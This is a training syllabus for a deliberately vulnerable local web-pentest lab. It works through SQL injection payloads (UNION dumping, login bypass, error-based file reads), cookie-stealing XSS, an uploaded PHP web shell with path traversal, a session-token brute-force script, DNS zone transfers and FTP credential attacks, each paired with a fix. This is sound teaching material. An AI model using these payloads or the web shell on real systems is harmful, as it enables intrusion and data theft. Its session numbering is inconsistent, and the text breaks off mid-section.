Widgetorium 101

A Hands-On Training Syllabus for the Widgetorium Web Pen Testing Lab

By Britley Hoff

2026 Edition

Nobody hands you a live target on day one. You do not get to point a scanner at a production storefront and see what falls out, and you should not want to. That is the gap this syllabus fills: a deliberately broken web application, a misconfigured file server, and a database full of fake customers, all running on your own machine with nothing routable anywhere near it.

This is a seven session course built entirely on the Widgetorium lab. Widgetorium is a widget shop, brackets and bolts and cable tidies, dressed up like a cross between a chocolate factory and a mail-order novelty catalogue, with twenty-four planted weaknesses across reconnaissance, SQL injection, transport security, the general web application layer, and an old FTP box wired into the same network. Every payload and every command in this book was run against the actual containers before this book went to print, not described from memory. Where the lab has an edge, the base image ships an OpenSSL without RC4 so you cannot demonstrate that particular cipher, vsftpd's anonymous path segfaults about once in a few hundred hits under a machine-gun scanner, this book says so plainly instead of pretending otherwise. A training environment that is honest about its own edges is more useful than one that quietly hopes you will not notice them.

The teaching flow is old-school first. Every session starts with the finding worked by hand, a browser, curl, openssl, dig, a packet capture, a short script, and only then brings in a scanner to confirm it and cover ground faster. OWASP ZAP is the discovery sweep once you already know the app; sqlmap enumerates an injection point you have already exploited by hand; testssl.sh prints the report whose lines you can already read out of a raw handshake. Doing it the manual way first is not nostalgia. Several of the twenty-four findings no scanner will surface on its own, a scanner connects a request to a response, it does not reason about who owns an order, whether a stored value will be trusted later, what a session token is made of, or which hostnames a zone transfer will cough up, and the trainee who has only ever clicked "active scan" cannot tell the difference between a clean result and a blind spot.

By the end you will have pulled a corporate domain apart with a zone transfer and a certificate, dumped the customer table through a search box, walked into the admin panel two different ways, planted a payload that fires only when an administrator opens a report, read a file off the database host through a price field, pulled a live API key out of an exposed .git directory, uploaded a web shell through an anonymous FTP login and run it from a browser, and chained the small findings into the big one. Then you will write it up.

Standing Up the Lab

Widgetorium is one docker-compose stack: a PHP and Apache storefront, a seeded MySQL 8 backend that is never published to the host, an intentionally misconfigured vsftpd whose anonymous upload directory is shared straight into the web root, and a BIND9 nameserver authoritative for the lab's fake corporate domain. Every published port binds to 127.0.0.1 only, DNS included; no real domain is required.

cd widgetorium
./setup.sh          # preflight, build images, generate the lab certs, plant the .git history
./start.sh          # bring it up; refuses to launch if any port would bind beyond loopback
./status.sh         # health check plus a loopback bind audit
./reset.sh          # wipe stateful bugs back to seed between cohorts

Surface | Address | Notes
Storefront (HTTP) | http://127.0.0.1:8080 | the target; also the admin/dev/staging vhosts by Host header
Storefront (HTTPS) | https://127.0.0.1:8443 | certificate warning is expected; internal vhosts by SNI
DNS | 127.0.0.1:5300 TCP and UDP | corp.widgetorium.lab and widgetorium.lab; dig @127.0.0.1 -p 5300
FTP | 127.0.0.1:21 plus 21100-21110 | anonymous, and ftpuser:ftpuser
Database | internal only | reachable only from the webapp container

To browse the virtual-host names, add them to /etc/hosts pointing at 127.0.0.1, or use curl --resolve and -H "Host: ...".

Accounts you are given

Who | Credentials | Use
Seed admin | admin / Widgetorium2024! | hash is unsalted MD5 in users.password_hash, crackable
Seed customers | alice / Password123, bob / letmein, and more | rockyou-class passwords for the cracking exercise
FTP service account | ftpuser / ftpuser | Session 6

Each session assumes a fresh browser session and a clean cookie jar. There is no shared state between sessions except what you plant yourself: an injected product row, a stored review, an uploaded shell. Run ./reset.sh when you want the lab back to seed.

The Toolbox

This course teaches the old-school way first. Every finding is worked by hand, with a browser, curl, openssl, and a packet capture, before any scanner is pointed at it. That order is deliberate. A trainee who has dumped a table with a hand-built UNION, read a TLS handshake line by line, and forged a session cookie in twenty lines of Python understands what the automated tool is doing when it does the same thing in one click, and, more importantly, understands what it is not doing. The scanners come in during the second half of each session, to confirm and to speed up the boring parts, never as the first move.

By hand, first

Tool | Role in this course
The browser + dev tools | Walk the app like a user, read every parameter, inspect the session cookie, craft and confirm XSS payloads, watch a downgrade happen.
curl | The workhorse. The auth bypass, the IDOR walk, the upload and its traversal, the API body, and every error-based injection are one-liners you type yourself.
openssl s_client | Read the certificate and the handshake directly: subject, SAN, dates, negotiated protocol and cipher. Understand the finding before a report summarises it for you. The SAN list is also a recon target: the internal hosts' certificate names more than DNS does.
dig | Query the lab nameserver on port 5300 by hand: SOA, NS, MX, TXT, and the zone transfer that should never work but does. Read the zone before dnsrecon parses it for you.
an FTP client (ftp, lftp) | Log in anonymously, walk out of the unjailed home directory, drop a file by hand.
tcpdump / Wireshark | Capture the cleartext FTP login on loopback and read the credentials off the wire yourself.
Python + requests | About twenty lines to predict and ride a session token. Not a tool problem, a scripting one, and worth doing from scratch.
git (plain) | Once the .git directory is pulled, git log -p is all you need to find the secret in history.

Automation, second

Tool | Role in this course
OWASP ZAP | Discovery sweep once you know the site by hand. Spider, AJAX spider, passive and active scan, and the Automation Framework plan in docs/zap/. Its value is coverage and speed, not insight.
sqlmap | After you have exploited an injection point manually, hand it the same parameter and watch it enumerate systematically. Teaches what --level and --risk actually change.
testssl.sh (or sslyze) | The full certificate and cipher report, once you can already read the same findings out of openssl s_client by hand.
gobuster / ffuf | Directory and content brute-forcing, and gobuster vhost mode for the internal virtual hosts. Finds the /admin/.git/ path, the hidden vhosts, and the FTP-uploaded shell faster than guessing.
dnsrecon | Automated zone walking and transfer against the lab nameserver, after you have done the transfer by hand with dig.
exiftool | Pull author, workstation, and keyword metadata out of the document left in the export bucket.
git-dumper | Reconstructs the exposed .git working tree and history from HTTP so plain git can take over.
nmap | Service and version detection against the FTP box (-sV -sC -p21).
Nikto | Fast web-server misconfiguration sweep, a cross-check against ZAP's active scan.
hydra | Credential brute-forcing against the FTP service account, once you have already guessed ftpuser:ftpuser by hand.
hashcat | Crack the unsalted MD5 password hashes pulled from the users table.

The instructor edition of the scenario guide, docs/scenarios.md in the lab repo, maps every one of the twenty-four findings to the tool that confirms it and the fix that closes it. Trainees work from docs/scenarios-trainee.md, the same document with the fix removed.

Session 1: Orientation and Mapping by Hand

Goal for this session: get the lab running, then map the whole application yourself, with a browser and curl, before any scanner touches it. Only at the end do you run ZAP once, as a baseline, and the exercise there is to see how little it adds to a map you already built by hand. Do not try to exploit anything yet.

1.1 Confirm the Lab Is Contained

Before you point anything sharper than a browser at this, prove to yourself it cannot reach past your machine.

./status.sh                                   # runs the bind audit, exits non-zero on any 0.0.0.0
docker compose ps --format '{{.Name}}\t{{.Ports}}'   # every mapping must read 127.0.0.1:
nmap -Pn -p 8080,8443,21 <this-host-LAN-IP>    # from another box: all filtered or closed

start.sh already refuses to launch a configuration that would bind beyond loopback, and status.sh re-checks the running containers. Run the external nmap once anyway. Proving your lab is contained, every time, is the same reflex you use on a client engagement to prove your test traffic stayed in scope. Build it now.

1.2 Walk the Store Like a Customer

Open http://127.0.0.1:8080 and behave like a shopper. Browse the catalogue. Open a product. Search for "bolt". Register an account, log in, look at your order history. Log in again as admin / Widgetorium2024! and notice the extra "Admin" link in the header. Then open the HTTPS side, https://127.0.0.1:8443, and read the certificate warning your browser gives you instead of clicking past it.

1.3 Map Every Endpoint by Hand

Now go through the site again with intent and write down, on paper or in a flat file, every request the app makes. View source. Read the forms. Note the method, the path, and every parameter:

GET  /search.php?q=            reflected on the page
GET  /product.php?id=
GET  /orders.php?id=           and the /order.php alias
POST /login.php               username, password
POST /register.php
POST /review.php              product_id, author, body
POST /upload.php              multipart: image, optional filename
POST /api/update_item.php     JSON: id, price, qty
     /admin/                  index, products, inventory_report, config
     /admin/.git/             does this respond?

Confirm each one with curl -i so you have seen the raw response, the headers, the status, the body, not just the rendered page:

curl -sI http://127.0.0.1:8080/                       # Server, X-Powered-By, no HSTS on the 8443 side
curl -s  "http://127.0.0.1:8080/search.php?q=bolt"    # how does the term come back?
curl -s  -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8080/admin/.git/config

By the end of this step you have a complete map of the attack surface that you built, not one a tool handed you. Every later session works from this map.

1.4 Read the Transport by Hand

Before testssl.sh does it for you in Session 3, look at the certificate and the handshake yourself:

openssl s_client -connect 127.0.0.1:8443 -servername widgetorium.local </dev/null 2>&1 \
  | openssl x509 -noout -subject -issuer -dates -ext subjectAltName
curl -ksI https://127.0.0.1:8443/ | grep -i strict-transport-security   # nothing comes back

You should be able to say, out loud, three things that are wrong with this before you have run a single scanner: the name does not match, it is self-signed, and there is no HSTS.

1.5 Now Run ZAP, Once, as a Baseline

Proxy your browser through ZAP, browse the store again so the site tree is seeded with authenticated traffic, then run the spider, the AJAX spider, and let the passive scanner drain. The lab ships an Automation Framework plan that does the sweep:

docs/zap/run-zap.sh          # spider + AJAX spider + passive + active scan
                             # report lands at docs/zap/out/report.html

Read docs/zap/widgetorium-zap-plan.yaml first so you know what it is doing. When the report is ready, do not read it top to bottom. Instead, put it next to your hand-built map and answer two questions:

What did ZAP find that is not on my map? (Usually very little. The missing HSTS header, the self-signed cert, the reflected XSS, the SQL injection on search, the verbose error, all things you can also see by hand.)
What is on my map that ZAP said nothing about? (The second-order injection, the IDOR on order history, the exposed .git directory, the predictable session token, and the entire FTP box.)

That second list is the rest of the course.

1.6 What You Should Notice

You mapped this application in half an hour with a browser and curl, and the scanner, run afterward, mostly confirmed what you already had. The findings that matter most, the ones about who owns an order, whether a stored value gets trusted later, what a session token is made of, were never going to come from a tool that only connects requests to responses. Old-school first is not a style choice. It is the only way to know where the automated tool stopped seeing.

Session 2: Reconnaissance and the Corporate Domain

Goal for this session: stop treating the lab as one IP on 127.0.0.1 and start treating it as an estate. Widgetorium runs its own nameserver, authoritative for a fake corporate domain, and behind that domain are hosts a port scan of a single address will never show you. Five findings here, an open zone transfer, a set of virtual hosts hiding behind the Host header, a certificate that hands over the guest list, a developer sandbox full of things nobody cleaned up, and an export bucket left open. None of them need an exploit. They need you to look.

The lab nameserver is on 127.0.0.1 port 5300, TCP and UDP. Port 53 belongs to your own machine's resolver and 5353 is taken by mDNS on macOS, so the lab uses 5300 and you point every tool at it explicitly. It is authoritative for two zones: corp.widgetorium.lab, the internal estate, and widgetorium.lab, the public face.

2.1 Passive First, and Why It Comes Up Empty

On a real engagement the first hour is passive: certificate transparency logs, theHarvester, amass in passive mode, a WHOIS lookup, Google. Run them here anyway, against corp.widgetorium.lab, and watch every one of them return nothing.

theHarvester -d corp.widgetorium.lab -b all
amass enum -passive -d corp.widgetorium.lab
curl -s 'https://crt.sh/?q=%25.corp.widgetorium.lab&output=json'

That is not a broken lab. The domain does not exist on the public internet, so there are no transparency-log entries, no scraped subdomains, no cached pages. This is exactly what an internal assessment of a private domain looks like: passive recon produces a blank page, and the tester who only knows the passive playbook is stuck. The move is to pivot to active, ask the infrastructure directly, and that is the rest of this session.

2.2 Ask the Nameserver

Start with the ordinary queries, by hand, before any enumeration tool. Read the SOA, find the nameserver, look for the obvious record types.

dig @127.0.0.1 -p 5300 corp.widgetorium.lab SOA
dig @127.0.0.1 -p 5300 corp.widgetorium.lab NS
dig @127.0.0.1 -p 5300 corp.widgetorium.lab MX
dig @127.0.0.1 -p 5300 corp.widgetorium.lab TXT
dig @127.0.0.1 -p 5300 www.corp.widgetorium.lab A

The TXT records alone are worth reading: an SPF string that names a mail host by IP, a DMARC record with a reporting address, a note that this is the internal zone. Now try the query that should never work against a stranger:

dig axfr @127.0.0.1 -p 5300 corp.widgetorium.lab

The whole zone comes back in one response. Every A record, the CNAMEs, the mail exchanger, every TXT string, and a set of hosts on 10.10.0.0/16 you had no other way to know about. This is finding 20: the zone allows a transfer from any client. allow-transfer was never restricted.

Do the same against the other zone and watch it behave correctly:

dig axfr @127.0.0.1 -p 5300 widgetorium.lab      # ; Transfer failed.

widgetorium.lab refuses the transfer, the way every zone should. Put the two side by side in your notes. The fix for finding 20 is one line: restrict transfers to known secondary servers, or turn them off, and keep an internet-reachable nameserver from ever holding the internal zone in the first place.

The enumeration tools do the same thing with parsing on top:

dnsrecon -n 127.0.0.1 -p 5300 -d corp.widgetorium.lab -t axfr

2.3 Which Names Are Real

The transfer handed you a list. Not all of it matters. Sort the records into three piles:

Points at 127.0.0.1. Live in the lab: www, shop, admin, api, dev, staging, legacy, ftp. These are your targets.
Points into 10.10.0.0/16. vpn, jenkins, ci, backup, mail, intranet-old. They resolve, but nothing in the lab answers on them, and security.txt (2.6) puts that range out of scope. Stale DNS is normal on real estates. Recording it is part of the job; scanning it here is not.
The wildcard. *.corp.widgetorium.lab resolves to 127.0.0.1 as well, which means every name you can think of resolves. Subdomain brute forcing by DNS resolution is useless here. You will have to enumerate a different way, which is the next step.

2.4 Virtual Host Discovery

The webapp on 127.0.0.1:8080 answers to more than the storefront. admin.corp.widgetorium.lab, dev.corp.widgetorium.lab and staging.corp.widgetorium.lab are separate name-based virtual hosts with their own document roots. A request with no Host header, a bare IP, or an unrecognised Host falls through to the shop, so nothing you did in Session 1 revealed them, and a port scan never will. This is finding 21.

By hand, send the Host header yourself and compare:

for h in www admin dev staging nope; do
  printf '%-9s ' "$h"
  curl -s -o /dev/null -w '%{http_code} %{size_download}\n' \
    -H "Host: $h.corp.widgetorium.lab" http://127.0.0.1:8080/
done

www and nope return the storefront, the same byte count. admin, dev and staging return something smaller and different. That difference is the whole detection. Now let a tool sweep a wordlist the same way:

gobuster vhost -u http://127.0.0.1:8080 --append-domain \
  --domain corp.widgetorium.lab -w <subdomains.txt>

The AXFR from 2.2 and the certificate from 2.5 both give you candidate names without guessing at all. To browse the hosts, add them to /etc/hosts pointing at 127.0.0.1, or keep using curl -H "Host: ..." and --resolve. The fix is a default virtual host that serves nothing useful, and keeping internal applications on their own listener or network rather than multiplexed onto the public one by header alone.

2.5 What the Certificate Gives Away

Even if the zone transfer were locked, the TLS layer would still talk. The internal HTTPS vhosts present their own certificate, selected by the SNI name you send in the handshake. Ask for one by name and read what comes back:

echo | openssl s_client -connect 127.0.0.1:8443 \
  -servername admin.corp.widgetorium.lab 2>/dev/null \
  | openssl x509 -noout -subject -ext subjectAltName

The subjectAltName lists thirteen hostnames. Cross-check them against the zone you pulled in 2.2: four of them, git, jenkins, vault and registry under corp.widgetorium.lab, are not in DNS at all. The certificate is leaking the intended host inventory, names someone planned for and put in the SAN, whether or not they exist yet. This is finding 22. Send a name that matches nothing instead and you get the storefront's certificate, the Session 4 one, with no SAN:

echo | openssl s_client -connect 127.0.0.1:8443 \
  -servername widgetorium.local 2>/dev/null \
  | openssl x509 -noout -subject -ext subjectAltName      # No extensions

testssl.sh will record the SAN list in its output too; reading it as a target list is your job, not the tool's. The fix is to stop enumerating internal hosts in a shared certificate: per-host certs, or a wildcard that names nothing specific, and keep internal-only names on an internal CA.

2.6 Read What People Left Behind

The dev vhost has directory listing on and is full of the things that accumulate on a box nobody owns. This is finding 23. Walk it:

B='-H Host:dev.corp.widgetorium.lab'
curl -s $B http://127.0.0.1:8080/robots.txt              # points at /s3/ and /notes/
curl -s $B http://127.0.0.1:8080/.well-known/security.txt # in-scope hosts, out-of-scope range
curl -s $B http://127.0.0.1:8080/phpinfo.php | grep -i 'PHP Version'
curl -s $B http://127.0.0.1:8080/notes/dev-notes.txt

The notes are the prize: staff names and the first.last username scheme, the svc-ldap-ro service account, the CI host's real address, a line saying ftpuser/ftpuser still works, and a reminder that the API key is still literal on staging. The admin vhost carries a listable /backup/ with a users-*.sql.bak that holds the real users table and its unsalted MD5 hashes, so you have the password hashes before you have touched the SQL injection in Session 3. Staging serves config.php.bak, the pre-refactor config with the database password and the API key in plain PHP, and a build-info.json with a version and a git commit.

Then there is the export bucket, finding 24:

curl -s $B http://127.0.0.1:8080/s3/ | xmllint --format -
curl -s $B -O http://127.0.0.1:8080/s3/widgetorium-migration-plan.pdf
exiftool widgetorium-migration-plan.pdf
curl -s $B http://127.0.0.1:8080/s3/backups/db-widgetorium-2024-11-04.sql.gz | gunzip -c

/s3/ returns an S3-style ListBucketResult naming its objects. The migration-plan PDF reads normally, but exiftool pulls its metadata: an author name and email, a Creator string that names the author's workstation, and keywords listing an internal host and a ticket number. The staff CSV gives you a full name list for a credential attack. The gzipped dump under backups/ has users rows and the API key in a comment. The fix across all of this is dull and total: directory listing off, no phpinfo or .bak files or notes in a document root, no unauthenticated buckets, and strip document metadata before anything is published (exiftool -all=).

2.7 What You Should Notice

You did not exploit anything this session. You asked a nameserver a question it should not have answered, you sent a header, you read a certificate, and you opened files that were sitting in the open. And you came away with an admin hostname, an API endpoint, a staging box that shares production secrets, two sets of password hashes, a username scheme, and a live API key. Every later session is easier because of it.

Notice too what the scanners did here. ZAP, pointed at the dev vhost, would flag the directory listing and the phpinfo page. It would say nothing about the zone transfer, the hidden vhosts, or the certificate's guest list, because those are dig, gobuster and openssl, not a web crawler. Recon is where the manual-first habit pays off first: the tools that matter here are the ones you drive yourself.

Session 2: SQL Injection, Four Ways

Goal for this session: exploit all four of Widgetorium's SQL injection bugs and understand why they are four separate bugs and not one. Two of them a scanner hands you. One of them a scanner will never find. One of them is really two bugs sharing an endpoint. By the end you will have the admin's password hash and a file read off the database host.

2.1 The Search Box: UNION-Based, Reads Any Table

The storefront search concatenates your term straight into a LIKE clause, and it selects three columns, so a UNION SELECT lines up cleanly.

curl -s "http://127.0.0.1:8080/search.php?q=x' UNION SELECT username,password_hash,role FROM users-- -"

The results table now lists every account and its unsalted MD5 hash. Hand that to sqlmap to see it work the problem systematically:

sqlmap -u 'http://127.0.0.1:8080/search.php?q=x' --batch --dbs
sqlmap -u 'http://127.0.0.1:8080/search.php?q=x' --batch -D widgetorium -T users --dump

Then take the hashes to john or hashcat with a rockyou-class wordlist. The seed passwords are all in it. This is where a trainee first feels the difference between "the scanner said injectable" and "I have the admin's password."

2.2 The Login Form: Authentication Bypass

The login query concatenates both the username and the password hash. The classic payload in the username field returns the first row in the table, which is the seed admin.

curl -si --data-urlencode "username=' OR '1'='1' -- " --data "password=x" \
     http://127.0.0.1:8080/login.php

You get a 302 to /account.php and a Set-Cookie: WIDGET_SESSID=. You are now the administrator. Do this one by hand before you automate anything; the mechanism, a quote that closes the string and a comment that eats the rest of the query, is the thing to internalise.

Look closely at the cookie you were handed. It will matter in Session 4.

2.3 Second-Order: The Payload That Waits

This is the one ZAP will not find, and it is the most instructive bug in the lab.

The admin product form stores the product name through a parameterised query. Quotes and SQL metacharacters go into the name column byte for byte, and nothing happens. No error, no reflection, no scanner alert. The payload just sits in the catalogue looking like a badly named product.

Later, an administrator opens the inventory report. That page loops over every stored product name and concatenates each one into a fresh query against a stock-ledger table. The dormant payload fires there. Because the report fetches a single row per product, a plain UNION hides behind the aggregate's first row, so use an error-based payload and read the data out of the error message the report prints.

As the admin, create a product with this name:

zz' AND updatexml(1,concat(0x7e,(SELECT concat(username,0x3a,password_hash)
    FROM users ORDER BY id LIMIT 1)),1)-- -

The storefront still looks normal. Open /admin/inventory_report.php and that row's "on hand" cell reads:

(error) ... XPATH syntax error: '~admin:042af043eff3ad41868f9ccdf'

Walk LIMIT 1,1, LIMIT 2,1 for the rest of the table. The teaching point: data already in your database is still untrusted input. Sanitising on the way in is not the same as parameterising the query that reads it back out.

2.4 The Price API: Injection and Broken Authorisation in One Endpoint

The api/update_item.php endpoint takes a JSON body of {id, price, qty} and updates a product. It has two independent bugs.

The authorisation half

Any logged-in user can call it. There is no check that the product belongs to the caller and no admin-role check. Log in as the customer alice and edit a product she does not own:

curl -s -b alice.jar -H 'Content-Type: application/json' \
     -d '{"id":7,"price":0.01}' \
     http://127.0.0.1:8080/api/update_item.php

The response confirms the change and shows your role as customer. That is an IDOR: the object reference, id, is under your control and nothing checks whether you should be allowed to touch it.

The injection half

Inject on id. It flows into WHERE id = <id>. The price and qty fields land in numeric columns that truncate any string you get back, so id is your extraction point. The database user holds the FILE privilege and secure_file_priv is empty, so LOAD_FILE works:

curl -s -b alice.jar -H 'Content-Type: application/json' -d '{
  "id": "7 OR updatexml(1,concat(0x7e,(SELECT LEFT(LOAD_FILE(0x2f7661722f6c69622f6d7973716c2d66696c65732f7365637265742e747874),40))),1)",
  "price": "1.00"
}' http://127.0.0.1:8080/api/update_item.php

The verbose SQL-error block comes back with the first bytes of the file. Note the scope: LOAD_FILE reads the database container's filesystem, not the web server's. Good targets from there are /etc/passwd, /etc/hostname, and the MySQL config. sqlmap will drive this with --data '{"id":"7*","price":"1"}'.

2.5 Why Four Bugs

# | Where | Scanner finds it? | Real lesson
1 | search box | yes, active scan | UNION structure, then crack what you dumped
2 | login form | sometimes | string break plus comment; do it by hand once
3 | admin report | no | stored data is still input; error-based when the sink fetches one row
4 | price API | injection yes, authz no | two bugs, one endpoint; pick the parameter that actually exfiltrates

Every one of these is "SQL injection" in a report heading, and every one needs a different head to exploit. The fix for all four is the same sentence, parameterise the query and never build SQL by concatenation, but you cannot write that fix with confidence until you have felt why the generic advice keeps not being followed.

Session 3: Certificates and Transport Security

Goal for this session: turn the three things you already noticed by hand in Session 1 into four documented findings, and add the one that needs a proper cipher probe. They are the kind auditors flag on real legacy deployments every week: a certificate that does not match its hostname, a certificate past its expiry, weak protocol and cipher support, and a missing HSTS header.

3.1 By Hand First

Before any TLS scanner runs, get the findings out of openssl and curl yourself. You did the first pass in Session 1.4; this is the full version.

openssl s_client -connect 127.0.0.1:8443 -servername widgetorium.local </dev/null 2>&1 \
  | openssl x509 -noout -subject -issuer -dates -ext subjectAltName
curl -ksv --tlsv1.0 --tls-max 1.0 https://127.0.0.1:8443/health.php   # does TLS 1.0 connect?
curl -ks  --tls-max 1.2 --ciphers AES128-SHA https://127.0.0.1:8443/health.php   # SHA1 CBC?
curl -ksI https://127.0.0.1:8443/ | grep -i strict-transport-security   # HSTS present?

You can name three of the four findings from that output alone: wrong name, self-signed, no HSTS. TLS 1.0 connecting and the SHA1 cipher being accepted are the fourth.

3.2 Then Let testssl.sh Do the Full Sweep

testssl.sh 127.0.0.1:8443

One run covers protocol versions, every cipher, DH size, expiry, and hostname mismatch in a readable report. sslyze is the alternative. Its job is coverage and a clean write-up, not to tell you something you could not already get from openssl s_client. Put its output next to your notes from 3.1 and confirm they agree.

3.3 Self-Signed, Wrong Name

The default certificate has CN=widget-store-prod-01, no subjectAltName at all, and is its own issuer. Nothing about it matches widgetorium.local or localhost.

openssl s_client -connect 127.0.0.1:8443 -servername widgetorium.local </dev/null 2>&1 \
  | openssl x509 -noout -subject -issuer -ext subjectAltName

testssl.sh reports this as a chain-of-trust failure and a hostname mismatch. The fix is a certificate from a trusted CA, or a managed internal CA for an internal-only app, with a SAN that actually lists the hostname. "It is just the CN" is a 2010 answer; modern clients ignore the CN and require the SAN.

3.4 Expired

Bring the lab up in the expired-certificate configuration and look again:

./start.sh --expired-cert
openssl s_client -connect 127.0.0.1:8443 </dev/null 2>/dev/null | openssl x509 -noout -dates

The validity window is entirely in January 2019. testssl.sh and every browser will refuse it outright. The lesson is not technical, it is operational: this is what "how did nobody notice" looks like from the outside. The fix is renewal automation and expiry monitoring, not a heroic manual replacement every two years.

3.5 Weak Protocols and Ciphers

The server offers TLS 1.0 and 1.1 alongside 1.2 and 1.3, accepts SHA1 CBC ciphers such as AES128-SHA, and serves 1024-bit Diffie-Hellman parameters.

curl -ks -o /dev/null -w '%{http_code}\n' --tlsv1.0 --tls-max 1.0 https://127.0.0.1:8443/health.php
curl -ks -o /dev/null -w '%{http_code}\n' --tls-max 1.2 --ciphers AES128-SHA https://127.0.0.1:8443/health.php

Both return 200. That is the finding.

A lab honesty note: the base image's OpenSSL is built without RC4, 3DES, and EXPORT ciphers, so you cannot demonstrate those specific suites here no matter what the config says. What Widgetorium does deliver, legacy protocol versions, SHA1 ciphers, weak DH, is the realistic profile of a system that has not been touched in a decade, and it is exactly what testssl.sh will light up in orange and red.

The fix: disable everything below TLS 1.2, cut the cipher list to modern AEAD suites, and use 2048-bit or stronger DH or, better, ECDHE. Running with WEAK_TLS=0 shows you the hardened baseline for comparison.

3.6 Missing HSTS

curl -ksI https://127.0.0.1:8443/ | grep -i strict-transport-security

Nothing comes back. Without Strict-Transport-Security, a client that first reaches the site over HTTP, or is pushed there by an attacker on the path, has no instruction to stay on HTTPS. Pair this with a strip demo in the browser dev tools to show what the missing header costs. The fix is one response header, sent over HTTPS, with a real max-age. Setting SEND_HSTS=1 adds it back.

3.7 What You Should Notice

Transport findings are the easiest category to scan for and the easiest to wave away, "it is only the cert," "nobody uses TLS 1.0 anymore." Reading the handshake yourself with openssl s_client, before the report tidies it into a colour, is what makes you stop waving. Each line is a specific promise the server is failing to keep: this connection is with who you think, it has not been tampered with, it cannot be quietly downgraded. A trainee who can walk an auditor's client through that report, line by line, is worth more than one who can only forward the PDF.

Session 4: The Web Application Grab Bag

Goal for this session: six findings that do not share a category but do share a theme, the application trusts something it should not. It trusts a URL parameter to name whose data you get. It trusts a filename. It trusts a stored string to be safe HTML. It trusts a token it made out of the clock. Two of these ZAP flags for you; four it does not.

4.1 Exposed .git Directory

A real git repository sits inside the web root at /admin/.git/. gobuster or ffuf against /admin/ finds it; ZAP's spider often will not, because it depends on wordlist coverage.

gobuster dir -u http://127.0.0.1:8080/admin/ -w <wordlist>
git-dumper http://127.0.0.1:8080/admin/.git/ ./loot
cd loot && git log -p | grep -i api_key

The working copy of config.php is clean, it reads the key from an environment variable. But the first commit put the key in cleartext, and the second commit only "moved it to the environment." The key is still in history:

WIDGETORIUM_API_KEY = 'wdg_live_sk_7f3c9a1e42b84d06b1e5c2aa9d770f18'

The fix is two-part and both parts matter: never deploy .git into a web root, and rotate any secret that has ever been committed, because "we removed it" is not "it is gone."

4.2 IDOR on Order History

Order IDs are sequential from 1001, and orders.php?id= does not check that the order belongs to you.

for i in $(seq 1001 1030); do
  curl -s "http://127.0.0.1:8080/orders.php?id=$i" | grep -o 'Customer ID [0-9]*'
done

No login required. You are reading thirty customers' orders and line items by counting. ZAP sees a page that returns 200 and moves on; it has no idea the ID belongs to someone else. The fix is an ownership check, AND customer_id = <session user>, before the row is returned. Unpredictable IDs help but are not the fix.

4.3 Reflected and Stored XSS in Reviews

Reflected, on the search page:

http://127.0.0.1:8080/search.php?q=<script>alert(1)</script>

Stored, through the review form, which needs no login and encodes nothing:

curl -s -d "product_id=1&author=x&body=<script>alert(document.cookie)</script>" \
     http://127.0.0.1:8080/review.php

Load that product page and the script runs for every visitor. Because the session cookie is not HttpOnly (Session 4.5), document.cookie hands you the token. ZAP flags both variants on the active scan. The fix is output encoding at render time plus a Content-Security-Policy, and setting HttpOnly so a stray script cannot read the cookie.

4.4 Unrestricted Upload with Path Traversal

The "sell a widget" form takes an image with no extension check, no content-type check, and, if you supply the optional "save as" field, it uses that name verbatim. Files land under the web root where PHP executes.

printf '<?php echo "SH:".shell_exec($_GET["c"]);' > sh.php
curl -s -F 'image=@sh.php' http://127.0.0.1:8080/upload.php
curl -s 'http://127.0.0.1:8080/uploads/sh.php?c=id'          # SH:uid=33(www-data)...

Now the traversal. PHP strips the path from $_FILES['name'], but the plain filename form field is not sanitised:

curl -s -F 'image=@sh.php' -F 'filename=../trav.php' http://127.0.0.1:8080/upload.php
curl -s 'http://127.0.0.1:8080/trav.php?c=id'                # served one directory up

The fix: whitelist extensions, validate content server-side, basename() the name, store uploads outside the web root, and disable script execution in the upload directory. Any one of those alone is not enough; a real fix does several.

4.5 Predictable Session Tokens

Log in as two seed users about a second apart and compare the WIDGET_SESSID cookies. The structure is hex(unix_time) followed by a zero-padded hex(user_id). It is not PHP's session ID; the application rolled its own.

The token is validated against a sessions row, so the target needs an active session, but that is the whole attack: an administrator logs in (or you use the Session 2 auth bypass, which mints exactly this cookie for user ID 1), and from a fresh client you enumerate a few hundred hex(time) values around that login for user ID 0001 until one loads the admin account.

python3 - <<'PY'
import time, requests
uid = "0001"
for t in range(int(time.time())-400, int(time.time())+1):
    tok = f"{t:x}{uid}"
    r = requests.get("http://127.0.0.1:8080/account.php",
                     cookies={"WIDGET_SESSID": tok})
    if "admin" in r.text.lower():
        print("hit:", tok); break
PY

The fix is cryptographically random tokens, random_bytes, or simply using the platform session manager instead of inventing one. Running with WEAK_SESSIONS=0 takes the attack off the table.

4.6 Verbose Error Messages

curl -s "http://127.0.0.1:8080/search.php?q=%27"

The response contains the failing SQL string and a stack trace. That is the raw material for Sessions 2.1 and 2.3, it hands you table and column names. ZAP flags it as information disclosure on the passive scan. The fix is generic error pages in production, display_errors = Off, and detailed logging kept server-side where the attacker cannot read it.

4.7 What You Should Notice

Reflected XSS and verbose errors, the two a scanner catches here, are the two where the payload goes straight back in the response. The four it misses, the .git directory, the IDOR, the upload, the session token, all require the tester to hold a model of how the application should behave and notice where it does not. That model is the job. The scanner is an assistant.

Session 5: The FTP Box

Goal for this session: pivot off the web application entirely and work the vsftpd server on 127.0.0.1:21. Four findings here, anonymous write, weak credentials, no chroot jail, cleartext authentication, and this is also where you set up the chained exploit that Session 6 finishes. ZAP has nothing to say about any of it; the tools change to nmap, an FTP client, hydra, and Wireshark.

5.1 Fingerprint the Service

nmap -sV -sC -p21,21100-21110 127.0.0.1

The service scripts alone will tell you anonymous login is allowed. Note the version and the passive port range; you will need passive mode for every transfer because the server sits behind Docker's NAT.

5.2 Anonymous Login with Write Access

Anonymous users land in a read-only root with a world-writable upload/ subdirectory. That is a deliberate detail, vsftpd refuses to serve a writable chroot root, so the writable bit is on the subdirectory, which is exactly how a lot of real misconfigurations end up looking.

echo "test" > note.txt
curl -s --ftp-pasv -T note.txt ftp://127.0.0.1/upload/note.txt
curl -s --ftp-pasv ftp://127.0.0.1/upload/note.txt        # reads back

The fix is to disable anonymous login, or, if a business case truly requires it, make it read-only and keep it out of any directory another service serves.

5.3 Weak Service Credentials

The service account is ftpuser:ftpuser. Confirm it by hand, then, if you are teaching credential attacks, let hydra find it:

curl -s --ftp-pasv -u ftpuser:ftpuser ftp://127.0.0.1/
hydra -l ftpuser -P rockyou.txt ftp://127.0.0.1

The fix is that no default credential ships, and service accounts get a real password policy or key-based access.

5.4 No Chroot Jail

